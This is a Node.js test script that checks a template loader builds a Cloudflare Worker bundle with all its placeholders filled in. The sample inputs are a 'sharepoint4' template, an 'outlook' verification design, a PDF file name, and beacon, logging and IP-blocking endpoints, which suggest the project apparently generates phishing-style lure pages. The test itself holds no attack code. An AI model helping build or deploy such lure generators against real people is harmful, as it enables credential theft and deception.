const path = require('path');
const dbPath = require.resolve(path.join(__dirname, '..', 'database', 'connection.js'));
require.cache[dbPath] = {
  exports: { query: async () => [[]] },
};

const templateLoader = require(path.join(__dirname, '..', 'services', 'templateloader.js'));

(async () => {
  const link = {
    id: 1,
    template_type: 'sharepoint4',
    verification_design: 'outlook',
    title_text: 'Test',
    message_text: 'msg',
    button_text: 'Go',
    file_name: 'file.pdf',
    pages: 1,
    destination_url: 'https://example.com',
    turnstile_enabled: true,
  };
  const user = { id: 99 };

  const worker = await templateLoader.buildWorkerScript(link, user, 'https://example.com');

  if (!worker || !worker.includes('export default')) {
    throw new Error('Cloudflare worker bundle missing the ESM export default wrapper');
  }

  const unreplacedLiteralAssignments = [
    "const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}'",
    "const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}'",
    "const LOG_ENDPOINT = '{{LOG_ENDPOINT}}'",
    "const JWT_TOKEN = '{{JWT_TOKEN}}'",
    "const TURNSTILE_KEY = '{{TURNSTILE_KEY}}'",
    "const templateHTML = '{{TEMPLATE_HTML}}'",
    "const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}'",
  ];

  const unresolved = unreplacedLiteralAssignments.filter((assignment) => worker.includes(assignment));
  if (unresolved.length) {
    throw new Error(`Worker bundle still contains unreplaced assignment literals: ${unresolved.join(', ')}`);
  }

  console.log('Cloudflare worker bundle validation passed.');
})();
